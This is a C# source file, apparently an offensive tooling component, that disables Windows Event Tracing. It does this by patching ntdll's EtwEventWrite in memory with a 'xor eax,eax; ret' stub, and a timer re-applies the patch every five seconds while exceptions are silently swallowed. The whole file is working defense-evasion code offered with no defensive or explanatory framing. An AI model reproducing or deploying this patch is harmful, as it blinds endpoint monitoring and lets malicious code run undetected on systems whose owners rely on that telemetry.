using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class EtwBypass
{
    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static Timer etwTimer;
    private static readonly int PatchIntervalMs = 5000; // every 5 sec patch

    public static void Start()
    {
        // first patch
        ETWBypass();

        //every 5 seconds 
        etwTimer = new Timer(_ => ETWBypass(), null, PatchIntervalMs, PatchIntervalMs);
    }

    public static void Stop()
    {
        etwTimer?.Dispose();
        etwTimer = null;
    }

    public static void ETWBypass()
    {
        try
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return;

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero)
                return;

            uint oldProtect;
            if (VirtualProtect(etwEventWrite, (UIntPtr)6, 0x40, out oldProtect))
            {
                byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret

                Marshal.Copy(patch, 0, etwEventWrite, patch.Length);

                VirtualProtect(etwEventWrite, (UIntPtr)6, oldProtect, out oldProtect);
            }
        }
        catch
        {
        }
    }
}
